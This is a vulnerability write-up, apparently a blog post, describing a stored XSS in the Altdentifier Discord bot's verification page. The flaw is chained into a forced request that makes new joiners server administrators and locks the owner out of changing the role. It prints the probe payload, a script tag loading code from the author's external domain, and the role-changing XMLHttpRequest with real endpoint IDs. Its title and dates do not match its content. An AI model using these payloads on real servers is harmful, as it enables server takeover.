---
layout: post
title:	"myBB - Add Administrator via XSS"
date:	2019-05-29 03:00:00
categories:
    - notes
tags:
    - bug_hunting
    - bug_writeup
---
<head>
	<title>Discord Bot | Stored XSS -> Persistent Server Takeover  </title>
</head>


# i. Introduction

I've previously written about the dangers of third party plugins for software. While browsing random coding forums one night, I've found that I particulary enjoyed and decided to enroll in their Discord. When I joined the Discord, I noticed that a Discord Bot by the name of AltIdentifier would message you, forcing you to connect your account with another website such as Steam, Twitter, Youtube, etc in order to prove you're not a bot or an alt ban evading.

As of when I'm writing this article (3/19/2020), `Altdentifier` is used by 23,864 Servers and over 6 million users:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

While 'verifying' my account, I've noticed something that would pique the curiosity of any bug hunter: Your Discord Username was being reflected on the verify page.

Just because the name is being reflected on the page doesn't mean the web application is vulnerable as sanitization can be taking place. However as we'll learn later on that while sanitizing 98% of input, it only takes one weak link in the chain to have it all come down...


# ii. Pre-Exploitation

As mentioned earlier in the article, the flow of how Altdentifier works is the the following:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

When joining a server, we notice we get a message from Altdentifier forcing us to confirm our account or we are kicked from the server:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Clicking on the link, we are brought to a page where we have to verify our account:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)


As you you can see our `Discord Name` is reflected in a few places. At this point, I figured why not try to see if we can inject any HTML into the page so I changed my Discord Name to include some HTML: `<s>mqt</s>`. 

Loading the verification link, we can see the page looks as:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)


As we notice in the middle of the page, there is a strike through our name. At this point where there's smoke, there's file. Looking at the page source we see that our name is reflected in many places, however sanitized:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

However there is one place, it isn't:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Awesome we are able to inject HTML into the page as our Discord Name is not being sanitized. At this point we pretty much have a sure shot of achieving XSS, unless a WAF gets in our way.

In order to confirm we are able to execute Javascript, I change my name to an XSS payload: `<img src=/ onerror=alert('mqt')</img>`.

I then attempt to re-verify:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

At the sight of the prompt, my heart skips a beat and we have Stored XSS!

However a weak prompt is not going to achieve any realistic 'impact', and furthermore there is a chance of this being a stored `Self-XSS` as this is reflecting under my account.

# iii. Chaining

At this point, I did my due dilligence and reported this to the bot developer. However they mentioned to me while this a cool finding, this would only affect the 'attacker' as the Javascript executes in the context of their account.

I wanted to see if this was true, so I created a new Discord Account with a Discord Server and added `Altdentifer` to my server.

Afterwards, I sent the my `Server Owner Account` the XSS payload, and noticed that the XSS still pops, however the developer is mostly correct that it's only executing under the context of my account (so I would not be able to elevate privileges). Though, I said why not and in the browser console fired off an `XMLHttpRequest` which would return the response of the Home Page as we saw that our `Server Owner` name was reflecting (in the top right):

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

[PIC OF XHR REQUEST]
![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

When the response was returned and I CTRL-F'd the name of the `Server Owner`, my heart skipped another beat as there was a match. So while in the verify link, the name of the user is reflecting in the top right, the user who is stll xyz authenticated.

So now we have two things:
1. Stored XSS
2. We are able to execute it on other users and perform actions as them.

As with everything, there's always a problem lurking in the background. In our case, `Discord` would only allow `32 Characters` max as your username. While this might seem like a lot of characters, we would need open and closed `<script>` tags including the `src` attribtue in order to call our external Javascript and those script tags with the attribute took up `21 characters` alone.

With just `11 characters` to spare, I purchased a domain which was five characters in length (including the extension).

With our new payload: `<script src=//7qa.pw></script>`, we were just `1` character short from the max length. Phew.

Perfect so now we're able to load external Javascript, however the question now is what can we do? As we are able to execute Javascript in the context of the application, we are able to effectively bypass `SOP` and execute requests on behalf of the user. In order to abuse this, we would need to find some functionality that is "juicy".

While browsing the `Server Dashboard` (where you are able to modify the bot's settings), I've noticed something interesting. 

You are able to set the role of the users when they first join the server:
![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)


Imagine if the user who joins the server (mind you not having to verify their account), is automatically granted admin privileges? That would be wicked, so let's see if we are able to achieve that.

First, I created an `Administrator` role on my tester. Next, I went into `Altdentifer` settings and checked if I am able to assign the `Administrator` role to users and spoiler alert: I was:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Awesome that's a great first hint. So in order for our external Javascript to send a request, we would need to know how a legitimate request looks like and the info it contains such as the type of request, the specific endpoint, and of course the parameters.

In order to retrieve this information, I performed a legitimate request as the `Server Owner` and just viewed the HTTP request:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Couple things to notice:

1. We see that we are sending a `POST` request to a specific endpoint which appears to contain a unique ID. If we are unable to retrieve this `ID` publically, then this vector is pretty much dead.

However I noticed this `ID` is the `ID` of our Discord Server:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Next, we can see that the request is sending form data. The specific parameter we are interested in is `in_verif_role` which is the role the user is given upon first joining the server (while they are still unverified):

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Damn it, from what it looks another unique `ID`. It would be a shame if this would break our chain as we are getting close to the prize.

After some Googling, I came across a article which showed how any user is able to get the `ID` of a `Server Role` on any Discord Server.

You can achieve this by calling the role using `@` and then prepending a backslash to it, which would look something like this:

~~~
\@Admin
~~~

Then the `Server Role ID` would print out (as you can see I did this with a low privilege account with no rank on the server):

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

At this point, I'm pretty much ready to jump out of my chair. We have all the components in order to 'theoretically' change the Unverified role to `Administrator`.

So now that we have all the pieces to the puzzle, we need to write our Javascript that would execute upon the `Server Owner` opening our `Verification Link`.

In my testing, I noticed that in the request we only need to send the paramater that we would like to change instead of having to send all the parameters. This made it a lot quicker (and as we'll see in the future, accidentally might've elevated the impact of this even more).

Here is the final Javascript payload:
~~~
var req = new XMLHttpRequest(); 
req.open("POST", "https://altdentifier.com/dashboard/690405840209051659", true); 
var formData = new FormData(); 
formData.append('in_verif_role', '690405914204831746'); 
req.send(formData);
~~~

We store our Javascript on the brand new domain we purchased as the index file, (as we do not have any more space to append a file path to our Discord Name).

Next we update our Discord name to our new payload, which in the end looked like this:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Awesome now we have to grab a verify link from `Altdentifier`, we can do this by joining a server which is using `Altdentifier` and viola we have a new link:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

Finally, we can setup our enviornment. We ensure we are logged in as the `Server Owner` on `Altdentifier`, and as the `attacker`, we message the `Server Owner` our link (note any user is able to message the link, doesn't necessarily have to be the user who generated it).

When the server owner opens the link, they don't see anything out of the ordinary. Maybe the XSS payload in the top right corner, but few would notice:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

After that is finished, as the `Server Owner`, I browse back to the Dashboard and click `Verification` and my mind is blown, we have changed the `Role` to `Admin`:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)


Remember earlier how I mentioned that only sending one parameter would lead to something interesting...well it appears because we sent only one parameter we broke some sort of application logic and now the `Server Owner` is unable to change the `Role` from `Administrator` as they are met with an error:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)


We were able to achieve persistence (as a form of denial of service). This makes this vulnerablity that more dangerous as the panicked `Server Admin` would go into his settings and attempt to change the `Verification Role` to a `Low Privilege Row` but they wouldn't be able to duue to the error. The only way for the `Server Admin` to 'fix' this situation is to kick the bot from the server, which would effectively make the server need to re-verify every user as the data would be lost.

Lastly, here's a video proof of concept which demonstrates the exploit from the start using the Victim's perspective:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/youtube.com)

# iv. Conclusion

This was one of the most interesting bugs I have worked on so far. There were many roadblocks when building out the chain and I am happy I was able to overcome them as I've learned a ton. First from our Discord Name being reflected (Which I thought was really cool) all the way to being able to take over the Server and prevent the `Server Owner` from changing the role unless they kick the bot and lose their data.


Remeber when there's smoke there's a fire. Always explore and go further in order to demonstrate what a simple client side attack is able to do.

Thank you for reading my notes,
\- mqt















